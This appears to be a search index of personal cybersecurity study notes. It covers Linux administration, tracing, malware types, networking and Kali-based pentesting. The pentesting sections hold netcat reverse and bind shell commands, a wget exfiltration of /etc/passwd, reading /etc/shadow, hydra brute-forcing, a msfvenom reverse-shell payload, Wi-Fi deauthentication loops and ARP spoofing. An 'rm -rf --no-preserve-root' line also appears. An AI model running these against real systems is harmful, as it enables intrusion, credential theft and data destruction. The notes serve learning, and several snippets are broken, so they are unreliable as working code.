{name/s}\n\u2022 sudo useradd {name} -m\n\u2022 su -\n\u2022 sudo visudo\n\u2022 sudo userdel {name}\n\u2022 sudo groupadd {name}\n\u2022 cat /etc/group\n\u2022 groups\n\u2022 %{groupname} ALL = NOPASSWD:ALL\n\u2022 sudo usermod -aG {name}\n\u2022 sudo gpasswd -d {name/s}\n\u2022 sudo groupdel {name}\n</code></pre> <p>Linux Package Management</p> <pre><code>\u00d8 dpkg - low level\n\u00d8 apt install - high level\n\n\n\u2022 dpkg -i \n\u2022 sudo apt install pidgen\n\u2022 sudo apt edit-sources\n\u2022 sudo apt list\n\u2022 sudo apt --installed | grep {name}\n\u2022 sudo apt search \n\u2022 sudo apt remove\n\u2022 sudo apt purge {app}\n\u2022 dpkg -l | grep nmap\n\u2022 sudo aptitude\n\u2022 sudo snap install --classic code\n\u2022 git clone {turbolist3r}\n\u2022 python turbolist3r.py  -d hackthebox.eu\n</code></pre> <p>Daemons</p> <pre><code>\u2022 ps -aux\n\u2022 ps -aux | grep {sublime/ntp}\n\u2022 pstree\n\u2022 sudo systemctl stop {sshd}\n\u2022 sudo systemctl start {sshd}\n\u2022 sudo systemctl restart {sshd/ systemd- journald}\n\u2022 sudo systemctl reload-or-restart {sshd}\n\u2022 sudo systemctl disable {sshd/ntp}                                   #when rebooting\n\u2022 sudo systemctl status{sshd}\n\u2022 sudo systemctl enable {sshd}\n\u2022 sudo systemctl is-active {sshd}\n\u2022 sudo systemctl list-units\n\u2022 sudo systemctl list-units -t service\n\u2022 sudo systemctl list-units | grep {nginx/journal}\n\u2022 sudo systemctl list-units --all | grep nginx\n\u2022 sudo systemctl list-unit-files | grep nginx\n\u2022 sudo systemctl is-enable {sshd}\n\u2022 sudo journal ctl -xe\n</code></pre> <p>Processors</p> <pre><code>\u2022 ps\n\u2022 ps -u {user} | grep {firefox}\n\u2022 pgrep {firefox}\n\u2022 kill {id}\n\u2022 ps -aux\n\u2022 top\n\u2022 htop\n\u2022 jobs\n\u2022 bg {id}\n\u2022 ps -ax\n\u2022 kill -l\n\u2022 sleep 900 &amp;\n\u2022 pkill -9 {ping/}\n</code></pre> <p>Sever</p> <pre><code>\u2022 python -m http.server {port}  #if not specified, default\n\u2022 php -S 127.0.0.1:8085\n\u2022 npx http-server -p  8086\n\u2022 systemctl start apache2\n\u2022 sudo nano /etc/apache2/ports.conf\n    \u25cb Listen {port number}\n\u2022 curl localhost:7600\n\u2022 curl -o {website} localhost:8080\n    \u25cb ls\n\u2022 curl -I localhost:8080\n\u2022 curl -v localhost:8080\n\u2022 wget localhost:7600\n</code></pre> <p>Shortcuts</p> <pre><code>\u2022 cd /usr/var/sniffjoke/generic\n\u2022 cd ../../..\n\u2022 cd -\n\u2022 echo $OLDPWD\n\u2022 ls -l\n\u2022 ls -al\n\u2022 ll\n\u2022 la\n\u2022 alias lumos=\"ls\"\n\u2022 nano .bashrc\n\u2022 CTRL + A               #begaining\n\u2022 CTRL + E                # end\n\u2022 CTRL + U               # delete everything before\n\u2022 CTRL + Y               # paste everything\n\u2022 CTRL + K               # delete everything after\n\u2022 ALT + BACKARROW   # Word by word delete\n\u2022 CTRL + X + E        # nano edit\n\u2022 sudo !!\n\u2022 TAB TAB                     \n\u2022 sudo tail -f /var/log/auth.log\n\u2022 CTRL + R\n</code></pre> <p>Files</p> <pre><code>cat &gt; file.txt\ncat &lt;&lt; EOF &gt; {filename} \n.BAK\nmkdir -p {dir}\ntree\ncp -r {dir/dir/}\nls {dir}\nrm -rf\nsudo rm -rf --no-preserve-root/\nnano {nameFile}.sh\n</code></pre>"},{"location":"Cybersecurity/Linux/Tracing/Tracing/","title":"Tracing","text":"<p>A traditional debugger allows you to inspect the system state once the system is halted To understand why an event took place, the relavent context has to be restored. This requires tracing </p> <p>Tracing is the process of collecting information on the activity in a working system With tracing, program execute is recorded during run-time, allowing for later analysis of the trace</p> <p>Tracing provides developers with information useful for debugging Difference between tracing and logging</p> <p>jus like logs, tracing data can be read as it With tracing, information is written about low level-events These numbers in the hundreds or even thousands</p> <p>With logging information is written about higher-level events, which are much less frequent. These includes users logging into the system, application errors database transaction etc</p> <p>ftrace</p> <p>official tracer in linux kernal. Function call trace Functional tracer ex : write a device kernal, debug it, confirm that everything fine </p> <p>CONFIG_FTRACE CONFIG_FUNCTION_TRACER CONFIG_FUNCTION_GRAPH_TRACER CONFIG_STACK_TRACER</p> <p>cat /boot/config-<code>uname-r</code> | grep CONFIG_FTRACE ls /sys/kernel/tracing cd /sys/kernel/debug  tracefs  mount -t tracefs nodev /sys/kernel/tracing</p> <p>All manipulations are done with simple operation (echo/cat) in tracefs ftrace is built around smart lockless ring buffer implementation This buffer stores all the tracing information and is exposed as a file in tracefs </p> <p>available_tracers</p> <p>nop             - No actions  functions       - Trace kernel functions entry functions_graph - Trace kernel functions entry and exit thus allowing to build a call graph blk             - Block tracer/blktrace nmiotrace       - Trace interactions between drivers and hardware</p> <p>Default tracer is nop</p> <p>current_tracer</p> <p>Enabling a tracer </p> <p>ex: cat available_tracers     echo 'functions' &gt; current_tracer     cat trace | head -n 20</p> <p>cat /proc/uptime </p> <p>Function graph tracer</p> <p>Function graph tracer is built on top of function tracer. It also records the return address. By this when a function enters and function exit </p> <p>Functio_graph tracer      - tracks the entry of the function     - tracks the exit of the function     - Execution Time      - CPU on which it is running </p> <p>echo functions_graph &gt; current_tracer </p> <p>functions starts with '{' and ends with '}'  functions do not call othe functions are denoted ';' also known as leaf functions </p> <p>time &gt; 10 microseconds      '+' time &gt; 100 microseconds     '-' time &gt; 1000 microseconds    '#' time &gt; 10 milliseconds      '*' time &gt; 100 milliseconds     '@' time &gt; 1 second             '$'</p> <p>cat trace | grep -F '$'</p> <p>Functions Filtering </p> <p>ftace printout can be big, finding exactly what it is you're looking for can be extremely difficult. filters - only functions we are interested in </p> <p>what functions are available for filter -&gt; All the functions in available_filter_functions </p> <p>Limiting functions tracing      set_ftrace_filter - Only trace these functions     set_ftrace_notrace - Do not trace these functions</p> <p>echo function_name &gt; set_ftrace_filter cat available_filter_functions | grep kmalloc </p> <ol> <li> <p>what happen if there are two functions with same function name It will enable both of them </p> </li> <li> <p>Does available_filter_functions file show only exported symbols or all kernel symbols? Every function which is present in callsystem, which is basically every single function </p> </li> </ol> <p>Starting and stopping the trace </p> <p>tracing_on is used to disable the ring buffer writeable or not  The ring buffer is not recording and will not attempt to write any data, but the calls the tracers make are still perform To re-enable the ring buffer, simply write '1' into that file</p>"},{"location":"Cybersecurity/Malware/Basic/","title":"Basic","text":"<p>Computer viruses explained</p> <p>Malware \u2022 Everything that is intentionally designed to cause interuptions to a computer, leak private information, gain unauthorized access to information system, deprive access to information system or unknowingly interfere with the users computer secuirty and privacy</p> <p>Virus \u2022 A type of malware that when executed replicates iteself by modifying other computer programs and inserting its own code into the program. If this succeeds the affected areeas are then said to be infected. Just like biological viruses. Generally requires a host program and writing its own code into it and when the host program runs, executing its own code first it causes infection and damage. It causes damage by system failures, corrupting data, wasting computer resources, increasing the maintainance cost or stealing peronal information </p> <p>Worm \u2022 Standalone computer malware that replicate itself in order to spread to other computers. Most of the time it uses a computer network to spread itself. Worm will  contiunosly scan to other computers. This behaviour continues exponentially increase it replication. Causes harm to network. Even by consuming bandwidth </p> <p>Trojan \u2022 Any malware that mislead user true intent by disguisng itself as standard program. Generally spread from some form of social engineering. As example user is duped into open a email attachment or by clicking fake advertistment. Trojan only explain how it enters the computer</p> <p>Malwertising  \u2022 Use of advertising in highly reputable websites to spread malware. Push their attacks to web users who might not see the ad due to firewall or safety precaustion in general. They can easily spread across a large number of legitimate websites without directly compromising those websites. Does not require ANY USERE INTERACTION like clicking to compromise the computer, does not exploit any web vulnerability </p> <p>RAT (Remote Access Trojan) \u2022 Malware tpe that remotely controll the computer through the internet. When cimputer is ratted, hacker can move the mouse, type, look at the person from the webcam &amp; record it etc. Most of the time it says silent and access the keylogger to gain your personal information </p> <p>Backdoor  \u2022 Authorized or unauthroized users able to get around normal secuirty measures.Can be used to steal personal/fincail data, install malware, hijack devices</p> <p>Rootkit \u2022 A program or collection of malicious software tools that give threat active remote access to control over a computer. Legitamate cases such as provide enduser support most rootkits open a back door on victim systems to malware and further network security attacks. Often prevent detection by deactivating antivirus softwares. Removal can be complicated or practically impossible if the rootkit is reside the kernal  </p> <p>Spyware \u2022 Malware infects the computer and secretly gathers information about the user. The sites visited, downloaded files, username &amp; password, email information. After the information gathered it may be used to exploit or sold</p> <p>Keylogger \u2022 Malware that secretly record what user is typing and then sending it to the hacker. TYpe of spyware</p> <p>Ransomware \u2022 Permanently block access to the victim's personal data and computer unless a ransom is paid. Some ransomwares lock the system without damaging the files, more advance malware uses a technique called 'cryptoviral extortion'. It encrypt the users files make it inaccessible ask a ransom payment to encrypt them</p> <p>Filess malware \u2022 It exist as a computer memory based malware. Such as RAM. Does not write any activity to hard drive. This make it difficult to detect and leaves little evidence. Used by hackers quick and stealthy operations. Used to gather data quickly since most of them are deleted once the computer is rebooted.</p> <p>Adware  \u2022 Malware install on to the computer without the knowledge often when downloading other softwares and display ads user browse the internet. Some of them are used as a spywae to collect or sold into targeted ads. Recognizable one is open a opup in an unclosable window </p> <p>RAM scraper \u2022 Install into a sale systems to collect personal information about like credit card numbers and pins of consumers. </p> <p>DDoS \u2022 Hacker tries to make a computer or connection unavailable. Flooding the targetet computer with superflous files in an attempt to over load them and prevent some or all legitamte request from being fulfiiled. The originated incoming is from different sources. Most of the time other infected computers as bots in a bot net</p> <p>Brower Hijacking \u2022 Unwanted software that changes a web browser settings without the user's permission to inject unwanted ads, change the homepage or even the search engine as a whole, installing its own. Many browser hijacking programs are accidently installed while installing other software that as a bundle in their installer and they often come up uninstall instructions or are presented in a way that is confusing for average users to trick them into installing unwanted extra software  </p> <p>Cryptojacking \u2022 Act of secretly exposing a computer to mine cryptocurencies. Its goal is stay silent as possible and mine as many coin as possible for profit. If the computer becomes victim of this practise it greatly slows down and risks breaking some of its hardware in the long run</p> <p>Rogue secuirty software \u2022 Form of internet fraud that misleads users into believing users that there is a virus in their computer and aims to convince them to pay for a fake malware removal tool that actually installs malware on the computer. Usualy spread through malvertising.  </p> <p>Phising \u2022 Scam which attackers deceiving people into revealing sensitive information or installing malware. Most of them are done by emails. where the attacker act as a reputable sources such as bank and sends the victim to a website that completly mirrors the real one. Once the vitim is logs in using their passsword. It gets sent to the attacker. \u2022 It can also perpetrated through phone calls where the attacker spoof his number to appear as it is coming from a legitamate instition or through SMS. \u2022 Phising is an example of social engiinering</p> <p>Hybrid Malware \u2022 Refers to as use of 2 or more malware by an attacker in a single attack. Most of the time these combinations combine trojans and worms or adwares or viruses</p> <p>Bruet force attacks  \u2022 Attacker submitting many passwords in hope to gain access to the account with the hope of eventually guessing it correctly. Attacker systematically check all the possible passwords until correct 1 is found through automated software.  short = easy long  = almost imposssible \u2022 When you fail to enter the correct password in most websites. It blocks for several moments</p> <p>Wiper \u2022 Malware intent to remove everything against the user's will. </p> <p>Social Enginnering \u2022 Not a malware. Psychological manipulation of people into performing actions or divulging confidential information   </p>"},{"location":"Cybersecurity/Malware/Malware%20Structure/","title":"Malware Structure","text":"<p>Portable Executables (PE)</p> <p>PE FILE FORMAT </p> <p>1) DOS Header 2) PE Header 3) Optional Header - Starting point of the program / Also size of the data 4) Section Header - Describe the data section in the [also tell what permissions it should grant : not writabel accdiently writing itself] 5) .txt section -  6) .idea section - Import Address Table (IAT)   7) .rsrc section 8) .reloc section</p>"},{"location":"Cybersecurity/Network/Networking/","title":"Networking","text":"<p>Protocols are agreed ways to communicate </p> <p>IP</p>"},{"location":"Cybersecurity/Network/Networking/#version-ihl-type-of-service-total-length","title":"Version   IHL    Type of Service   Total Length","text":""},{"location":"Cybersecurity/Network/Networking/#identification-ip-flags-fragment-offset","title":"Identification    IP Flags   Fragment Offset","text":""},{"location":"Cybersecurity/Network/Networking/#time-to-live-tli-protocol-headerchecksum","title":"Time to Live (TLI)    Protocol   HeaderChecksum","text":""},{"location":"Cybersecurity/Network/Networking/#source-address","title":"Source Address","text":""},{"location":"Cybersecurity/Network/Networking/#destination-address","title":"Destination Address","text":""},{"location":"Cybersecurity/Network/Networking/#ip-option","title":"IP option ()","text":"<p>TCP</p>"},{"location":"Cybersecurity/Network/Networking/#source-port-destination-port","title":"Source Port               Destination Port","text":""},{"location":"Cybersecurity/Network/Networking/#sequence-number","title":"Sequence Number","text":""},{"location":"Cybersecurity/Network/Networking/#acknoledgment-number","title":"Acknoledgment Number","text":"<pre><code>                                                  Window size\n</code></pre>"},{"location":"Cybersecurity/Network/Networking/#checksum-urgent-pointer","title":"Checksum            Urgent Pointer","text":""},{"location":"Cybersecurity/Network/Networking/#options-padding","title":"Options                   Padding","text":"<p>DNS have 4 sectors  </p> <ol> <li>Dense cache : you dont have to again to look the IP address</li> <li>Resolvers : </li> <li>Name Servers</li> <li>Name Space</li> </ol> <p>Every DNS has an public an private key.</p> <p>Automobile use several different protocols to communicate between multiple micro controllers such as sensors, gauges, actuators etc</p> <p>Controll Area Network (CAN)</p> <p>It was designed by Germany, communication with vehicle micro controllers and devices without a host computer</p> <p>CAN runs on 2 wires,    CAN High   CAN Low</p> <p>CAN Message Type </p> <p>Data Frame : only used for data transmission   Remote Frame   Error Frame   Overload Frame</p>"},{"location":"Cybersecurity/Network/Networking2/","title":"Networking2","text":"<p>If computer became and apartment</p> <p>IP address is the street address Port number is the room number</p> <p>Classes of IP address   class A : 0.0.0.0 - 127.255.255.255   class B : 128.0.0.0 - 191.255.255.255   class C : 192.0.0.0 - 223.255.255.255</p> <p>Public IP address have 4.3 billion </p> <p>Class private address   class A : 10.0.0.0 - 10.255.255.255   class B : 172.16.0.0 - 172.16.255.255   class C : 192.168.0.0 - 192.168.255.255</p> <p>DHCP - Dynamic Host Configuration Protocol</p> <p>On LAN, we use private address  gives an IP address for fixed amount of time DHCP server which is known as \"lease\"</p> <p>NAT (Network Address Translation) Internal private IP addresses are converted to external Public IP address</p> <p>How many ports are available: 2 ^ 16 = 65, 536 first 1024 are common addresses</p> <p>Protocol? are simply an agreed upon way to communicate </p> <p>Protocol are rules are Request for Comments</p> <p>There are many protocol [TCP, UDP, IP, FTP, SMTP]</p> <p>IP used to define the source and destination IP address of a packet as it traverses the internet.</p> <p>Subnetting </p> <p>netstat -&gt; network statistics see specific connection   netstat -a | grep http</p> <p>ss is even more detailed version of netstat</p> <p>Network sniffer - packet analyser, protocol analyzer, network traffic analyzer</p> <p>Fliter tcp Flags </p> <p>tcpdump 'tcp[tcpflags] == tcp-syn'   tcpdump 'tcp[tcpflags] == tcp-ack'   tcpdump 'tcp[tcpflags] == tcp-fin'   tcpdump 'tcp[tcpflags] == tcp-rst'   tcpdump 'tcp[tcpflags] == tcp-urg'   tcpdump 'tcp[tcpflags] == tcp-urg'</p> <p>tcpdump not host 192.12.192.12 tcpdump --vvAls0 | grep 'User-Agent'</p> <p>firewall can either hardware or software</p> <p>IpTable   : built up on main things known as      - tables     - chains     - targets</p> <p>There are 4 tables:</p> <p>Filter  - default table is none other speicified    NAT     - rewrite source/destination of packets   Mangle  - packet alternation such as modifying the TCP header   RAW     - configuration exemptions from connection tracking </p> <p>Chains  List of rules in the table</p> <ul> <li>INPUT = packets designed for coming to the system </li> <li>FORWARD = packets designed for leaving the system</li> <li>OUTPUT = packets designed for routed through local system</li> </ul> <p>Match : packet meets condition </p> <p>Targets    : Accept   : DROP   : LOG   : REJECT   : RETURN</p> <p>sudo iptables -L  sudo iptables -h </p> <p>sudo iptables -A INPUT -s 192.168.0.0/24  -j DROP</p> <p>sudo iptables -A OUTPUT -p </p> <p>to flush the iptable we can use    iptable -F</p>"},{"location":"Cybersecurity/WebPentest/Kali1/","title":"Kali1","text":"Layer 3 :   ipv4    ipv6    Layer 2:  MAC       Layer 4:   TCP   - Connection protocol  UDP  -  Connectionless protocol   Pentesting - Loud and seen Red team     DHCP    temporary address                                        static address    SNMP = Simple Network Management Protocol       sudo          = super user do                         sudo su -     = run as administrator                  cd /     = cd to the base dir &amp; etc folder cd    cd ~ ls -la        = Long list                          d = dir, l = link                                 3 groups: drwxr-xr-r-x 1st = Owner of the file 2nd  = group ownership  3rd = all other users  chmod rwx &lt; file name&gt; chmod 777 &lt; file name&gt; chmod u+x &lt; file name&gt; &gt; overwrite &gt;&gt; append wc -w &lt; filename&gt; cat &lt;&lt; EOF wc -w &lt;&lt;&lt; \"HElp , just kidding\" echo $? [ 1 = 1 ] [ 1 -eq 1 ] echo $?    sudo adduser &lt; name&gt;                                            su &lt; name&gt;                                                      netstat etc = store system information                                  echo \"Hello write this content here\" &gt; hey.txt                  cat hey.txt                                                     echo \"Hello write this content here\" &gt;&gt; hey.txt                  sudo service apache2 start                                      sudo service apache2 stop                                        sudo systemctl enable ssh                                       sudo systemctl disable ssh                                      sudo apt update &amp;&amp; apt upgrade                                  ping &lt; ip address&gt; -c 1                                         ping &lt; ip address&gt; -c 1 &gt; ip.txt cat ip.txt cat ip.txt | grep \"64 Bytes\" cat ip.txt | grep \"64 Bytes\" | cut -d \" \" - f 3                  cat ip.txt | grep \"64 Bytes\" | cut -d \" \" - f 3 | tr -d \":\"     mousepad &lt; filename&gt;&amp;                                           #!/bin/bash for ip in \\`seq 1 254`: do ping -c 1 $1.$ip | grep \"64 bytes\" | cut -d \" \" .f 4 | tr -d \":\" &amp; done fi nc - nvlp 7777    #!/bin/python3 import socket  HOST = '127.0.0.1' PORT = 7777 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(HOST,PORT)    import sys import socket from datetime import datetime  if len(sys.agrv) == 2:     target = socket.gethostbyname(sys.argv[1]) else:     print(\"Invalid no of arguments\") print(\"-\" *  50) print(\"Scanner Target : \" + target ) print(\"Time started : \" + str(datetime.now())) print(\"-\" *  50)  try:     for port in range(1,65535):         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)         socket.setdefaulttimeout(1)         result = s.connect_ex((target,port))         if result == 0:             print(\"Port {port} is open\")         s.close()  except KeyBoardInterrupt:         print(\"Existing program\")         sys.exit()  except socket.gaierror():     prin(\"Hostname\")     sys.exit()  except socket.error:     print(\"Could not connect to a server\")     sys.exit()    site:google  -w    filetype:pdf,xlx    network mapper most common scanner  nmap -T4 -p- -A &lt; ip address&gt; nmap -T4 -A -p-53,80,111,443,514  &lt; ip address&gt; nmap -T4 -p- -A &lt; ip address&gt; -oA client nmap -sU -T4 &lt; ip address&gt;  T1 - T5 (Speed, T5 may not detect ) -A = (os detectopn... lot of detaiils) -p-  (all port) (we can also put spceific port) nmap -sn &lt; ip address&gt; nikto scan if found the website good firewall might block (not usually) nikto -h &lt; https://192.168.57.1&gt;    nikto -h &lt; website address&gt;    dirbuster durb gobuster    RHOST = Remote Host  (Always the victim) smbclient -L \\&lt; ip address&gt;  \\\\\\\\&lt; ip address&gt;  Enumeration is a data gathering process wherein a cyber attacker extracts information about a network, such as host IP addresses, DNS and user names, or sharing and network protocols, intending to find weak points and breach the network. Revsere shell = Victim connect to us (95% time) Bind shell = We connected to vitim (Externam Assessments)    nc -nvlp 4444                                      (exploiter)                nc &lt; ip address&gt; 4444 -e /bin/bash                 (victim)                   nc &lt; ip address&gt; 4444                              (exploiter)  nc -nvlp 4444 -e/bin/bash                          (victim)     cat etc/shadow hydra -l root -P /usr/share/wordlists/metasploit         (double tap)( 2*space ) hydra -l root -P /usr/share/wordlists/metasploit/unix_password.txtssh://&lt; ip address&gt; -t 4 -V   msfconsole search ssh search portscan use auxilary/scanner/ssh/ssh_login info options  set ports 1-65535 set rhosts 192.168.1.254 use auxilary/ run search tomcat   set username root set passfile /usr/share/wordlists/metasploit/unix_password.txt set rhosts &lt; ip address&gt;    set threads 10 run  set verbose true    default webpage : is it meant to be online? poor maintanance   Metasploit    msfconsole   options SET RHOST   We should attack RHOST/S    cp updatedb locate &lt; file name&gt; import man ls chmod +x &lt; file name&gt;   netstat -ano route history | grep ifconfig apt install git -y service apache2 start service ssh start service postgresql start"},{"location":"Cybersecurity/WebPentest/Kali2/","title":"Kali2","text":"<p>theharvestor -d tesla.com -l 500 -b google.com      (domain, searchthrough) bluto</p> <p>crt.sh       (website) %tesla.com wappalyzer (firefox extension) -&gt; tesla.com&gt; false information possibility whatweb -v tesla.com buildweb</p> <p>physical asssessment - google map wireshark&amp;</p> <p>SYN  SYN ACK ACK SYN SYN ACK RST          (Just Kidding)</p> <p>Also check UDP not only TCP ls /usr/share/nmap/scripts/ nmap -p 443 --script==all nmap -p 443 --script==ssl-enum-ciphers tesla.com dpkg -i &lt; Ness...&gt; /etc/init.d/nessusd start https://kali:8334</p> <p>netdiscover -r &lt; ip address (:0/24)&gt;</p> <p>python -m SimpleHTTPServer 80 wget &lt; https://192...&gt;&lt; filename.txt&gt; nc -nvlp 8081 wget --post-file=/etc/passwd &lt; ip address&gt; windows cmd:  certutil -urlcache -f &lt; https://192.168.../secrets.txt&gt; secrets.txt python -m pyftpdlib -p 21     ftp &lt; ip address&gt;</p> <p>set rhosts &lt; ip address&gt; set smbdomain marvel set smbpass Password1 set smb fcastle set target 2 run </p> <p>upload download</p> <p>cd /opt sudo git clone &lt; link to pimpmykali&gt; sudo ./pimpmykali</p> <p>sudo apt install docker-compose sudo apt install docker.io unzip &lt; file name&gt; sudo docker-compose up sudo systemctl stop apache2 sudo docker ps -a sudo docker stop &lt; address&gt;</p> <p>ffuf sudo apt install subfinder assetfinder &lt; webiste name&gt; assertfinder &lt; webiste name&gt; | grep &lt; website name&gt; | sort -u &gt; azena.txt amass enum -d &lt; file name&gt; &gt; &lt; filename&gt; httprobe cat &lt; filename&gt; | grep &lt; filename&gt; | sort -u | httprobe -prefer-https | grep https &gt; &lt; filename&gt; gowitness file -f &lt; filename&gt; -P azenapics --no-http sudo apt install seclist ffuf -request &lt; filename&gt; -request-proto http -w /usr/share/seclists/Passwords/&lt; filename&gt; -fs 1814 ffuf -u &lt; link&gt; -w num.txt -mr 'admin' curl &lt; api website link&gt; curl --proxy &lt; api website link&gt; -k curl -X -POST --proxy &lt; api website link&gt; -k -d \"{name:'cheese cat'}\" curl -X POST -H \"Content-Type: application/json\" -d '{\"username\":\"jeremy\" , \"password\":\"cheescake\"   }' echo &lt; above command generated link&gt; | base64 -d  curl -X GET &lt; link&gt; curl -X GET &lt; link&gt;</p> <p>usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 -q 386F4337  Control EIP gedit &lt; filename&gt; !mona modules locate nasm_shell copy link (long one -&gt; execute) nasm&gt; JMP ESP !mona find -s \"xff\\xe4\" -m essfunc.dll  </p> <p>msfvenom -p windows/shell_reverse_tcp LHOST=&lt; ip address&gt; LPORT=4444 EXITFUNC=thread -f c -a x86 -b \"\\x00\"</p> <p>metasploit modules auxiliary - Information gathering encorder - encode the payload evasion - compress &amp; bypass AV exploit -  nops - Memory explotation payload - Reverse shell, execting commands post - After exploitation happen , Backdoor</p> <p>apt-get install aircrack-ng apt-get install macchanger man aircrack-ng macchanger --help ifconfig wlo1 down iwconfig wlo1 mode monitor ifconfig wlo1 up iwconfig  iwconfig wlo1 iwconfig wlo1 | grep mode iwconfig wlo1 | grep Mode airmon-ng check wlo1 kill &lt; Net work manager&gt; airmon-ng check kill airodump-ng wlo1 aireplay-ng aireplay-ng -O 0 -a &lt; mac address&gt;  (0 = loop, 1 = Once) iwconfig wlo1 channel maccchanger -s wlo1 macchnager -r wlo1 ifconfig wlo1 down macchanger -r wlo1 ifconfig wlo1 up macchanger -s wlo1 tochds.sh nano.sh</p> <p>while True: do     aireplay-ng 0 10 &lt; ip address&gt; wlo1     ifconfig wlo1 down     macchanger -r wlo1 | grep NEW mac     iwconfig wlo1 mode monitor     ifconfig wlo1 up     sleep 5 done</p> <p>chmod +x dos.sh dos.sh</p> <p>hydra -h  hydra -L &lt; path&gt; -P  &lt; path&gt;  &lt; ip adress&gt; http-form-psot \"/bruteforce/login.php:uname=^USER^&amp;pass=^PASS^\":failure         (l=1,L=List) crunch -h crunch 3 5 abcde        (min,max,characters)</p> <p>service tor status service tor start proxychains firefox www.duckduckgo crontab --help @reboot macchanger -r eth0</p>"},{"location":"Cybersecurity/WebPentest/PythonHacking/","title":"PythonHacking","text":"<p>MAC address = unique for global, connected or disconnected  Tranfer data between data Why change MAC address Increase Anonymity Impersonate other devices Bypass filters ifconfig (eth0/wlan0) down  ether = mac address ifconfig (eth0/wlan0) hw ether 00:11:22:33:44:55   [12 characters] Enable the interface ifconfig eth0 up</p> <p>python program to automate mac address changer</p>"},{"location":"Cybersecurity/WebPentest/PythonHacking/#usrbinpython","title":"!/usr/bin/python","text":"<p>import subprocess subprocess.call(\"ifconfig\",Shell=True) subprocess.call(\"ifconfig wlan0 hw ether 00:11:22:33:44:55\",Shell=True) subprocess.call(\"ifconfig wlan0 up\",Shell=True)</p> <p>netdiscover -r 10.0.2.1/24 </p> <p>Communication between a network = MAC Communication between different  network = IP address ARP = Admission Resolution Protocol ARP : I do not kow the mac address, but I know the IP address, who is this? send me the MAC </p> <p>rout -n hwsrc = hardware source / mac address psrc = packet source</p> <p>ARP spoffing: Physical address(windows can be exploit)</p> <p>arp -a arpspoof -i eth0 -t  [victim ip addresss]  [hacker ip address] echo 1 &gt; /proc/sys/net/ipv4/ip_forward       # Port forwarding(linux initially stopped) (automatically to our mac address [])</p> <p>Strings &amp; Bytes Difference  String: - Sequences of characters - Human Readable Bytes: - Sequence of bytes - Machine readable</p> <p>pip install netfilterqueue iptables -I FORWARD -J NFQUEUE --queue-num 0 iptables --flush /var/www/html sport dport = http seq  ack  ack = seq remove len , chksum modified the value so need to chane, scapy will then auto  gzip : html  Oh wait! this is more length than expected; so cut the connection  contenet length change ? what should we do : Python Regex treat the variable as a number bettercap -iface eth0 -caplet hstshijack/hstshijack bettercap 80 -&gt; 8080 in py code 1.0   1.1 chunk encode</p> <p>killall python nc -vv -l -p 4444</p> <p>Backdoor socket Problem : - TCP is streamed based - Difficult to identify the end of message / batch Soluion : - Make sure the message is well defined - Implement a protocol that send and receive methods conform to     * Send size of message as header     * Append a end-of-message mark to the end of each message     * Serialize the message Backdoor Serialization 1. Message is well defined, reciver knows if message is incomplete 2. Can be used transfer objects (lists, dicts,)</p> <p>Implementation * JSON and Pickle are common solutions * JSON (Javascript Object Notation) is implemented many programming languages * Represents objects as text * Widely used when transferring data between client and servers</p> <p>stack = faster, mutable heap = slow, imutable camel case = helloWorld snake case = hello_world kebab case = hello-world Hoisting = other functions can be written below main function Statement = anything that does not returns a value Expression = anything that return a vallue C, C++ ---&gt; Memory managment control issue Garbage collector  solved this issue, but created a new issue -&gt; slow performance [ stopping &amp; resuming the program] shadowing  let x = 5 let x = x + 1</p> <p>apache : web sever</p> <p>How to attack a websiite An application installed on a computer       ----------&gt; web application pentesting Computer uses an OS + other                  ----------&gt; server side attacks Managed by humans                            ----------&gt; client side attacks</p> <p>subdomain for : employees, beta testing video.google.com  &gt; subdomain   /directory name</p>"},{"location":"Cybersecurity/WebPentest/SQL/","title":"SQL","text":""},{"location":"Cybersecurity/WebPentest/tools1/","title":"Tools1","text":"<p>Reconnaissance</p> <p>\u2022 Recon ng \u2022 recon-ng workspaces \u2022 marketplace search  \u2022 marketplace install {name} \u2022 marketplace load {name} \u2022 db \u2022 options set SOURCE {website name} \u2022 modules load {} \u2022 options list \u2022 whatis {command}                    (1 line manual) \u2022 dig {website name} ANY \u2022 host {website name} \u2022 nslookup {website name} \u2022 tracerout {website name} \u2022 dnsrecon -d {website name} \u2022 wafw00f {website name} \u2022 dig @8.8.8.8.8 {website name} ANY \u2022 whois {website name} \u2022 whatweb {website name} \u2022 theHarvester \u2022 theHarvester -d  \u2022 sublist3r \u2022 sublist3r -d {website name} Google Search   site:cnn.com   -site:www.cnn.com     inurl:docs.php   filetype:doc</p> <p>\u2022 dnsrecon -d {website name} -t {axfr} \u2022 fierce --domain {website name} --subdomain{wordlist file} \u2022 sudo apt-get install knockpy \u2022 knockpy {website name} -w {wordlist file}</p> <p>\u2022 nmap \u2022 sudo nmap -sS -sV -p 443 {ip} --script=ssl-heartbleed -oN {file_name.txt}</p> <p>\u2022 searchploit {name}</p> <p>nikto nikto -h {website name} wfuzz gobuster git clone sn1per sudo bash install.sh sudo sniper -t {website name} -m {} -o -re sudo apt-get install amass amass intel -whois -d {zonetransfer} -dir amass enum -d {website name} amass enum -d {website name} -src -ip -brute -dir {zonetransfer} amass db -dir {zone transfer} amass viz -dir {zone transfer} -d3  run</p> <p> {.resizable} img.resizable {     height: 50px;     width: 50px; }</p> <p>NMAP  Command: nmap -sS [target] This is the most popular scan option because it is both fast and stealthy.</p> <p>Command: nmap -sT [target] This is the most basic type of TCP scan. It is used when the user does not have raw packet privileges.</p> <p>Command: nmap -sU [target] Scans for open UDP ports. It's slower and less reliable than TCP scans because UDP is connectionless.</p> <p>Command: nmap -sA [target] This scan type is used to map out firewall rulesets, determining whether they are stateful or not.</p> <p>Command: nmap -sW [target] A more advanced scan that can sometimes detect open ports when a SYN scan can't.</p> <p>Command: nmap -sM [target] Used to detect firewalls and filter systems that drop certain TCP segments. Comprehensive Port Scan</p> <p>Command: nmap -p- [target]</p> <p>Command: nmap -p [range] [target] Example: nmap -p 20-80 [target] Service Version Detection: Additional Nmap Options Command: nmap -sV [target] Attempts to determine the version of the services running on open ports.</p> <p>Command: nmap -O [target] Tries to identify the operating system of the target.</p> <p>Command: nmap -A [target] Combines OS detection, version detection, script scanning, and traceroute.</p> <p>Command: nmap -sC [target] Runs a collection of Nmap scripts against the target.</p> <p>Command: nmap -oN [filename] [target] Save the output to a normal text 